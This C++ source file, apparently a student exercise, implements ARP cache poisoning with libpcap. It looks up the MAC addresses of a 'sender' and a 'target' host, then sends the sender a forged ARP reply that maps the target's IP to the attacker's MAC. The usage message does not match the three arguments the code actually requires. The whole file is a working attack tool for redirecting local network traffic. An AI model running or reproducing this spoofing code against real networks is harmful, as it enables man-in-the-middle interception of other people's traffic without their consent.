#include <iostream>
#include "arp_set.h"
#include "get_my_addr.h"
#include "get_target_addr.h"

using namespace std;
void usage() {
  printf("syntax: pcap_test <interface>\n");
  printf("sample: pcap_test wlan0\n");
}
int main(int argc,char *argv[])
{
    if (argc != 4) {
    usage();
    return -1;
  }

    char *dev = argv[1];
    char c_atk_ip[INET_ADDRSTRLEN];
    char *snd_ip = argv[2];
    char *trg_ip = argv[3];

    uint8_t atk_mac[ETHER_ADDR_LEN];
    uint8_t snd_mac[ETHER_ADDR_LEN];
    uint8_t trg_mac[ETHER_ADDR_LEN];

    memset(snd_mac,0x00,ETHER_ADDR_LEN);
    memset(trg_mac,0x00,ETHER_ADDR_LEN);



    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
      return -1;
    }
    get_my_addr(dev,c_atk_ip,atk_mac);
    printf("Send arp Request to %s\n",trg_ip);
    send_arp(c_atk_ip,atk_mac,trg_ip,trg_mac,REQUEST,handle);
    get_target_mac(trg_mac,trg_ip,handle);
    printf("Send arp Request to %s\n",snd_ip);
    send_arp(c_atk_ip,atk_mac,snd_ip,snd_mac,REQUEST,handle);
    get_target_mac(snd_mac,snd_ip,handle);
    printf("Send arp Reply to %s\n",snd_ip);
    send_arp(trg_ip,atk_mac,snd_ip,snd_mac,REPLY,handle);

    return 0;
}
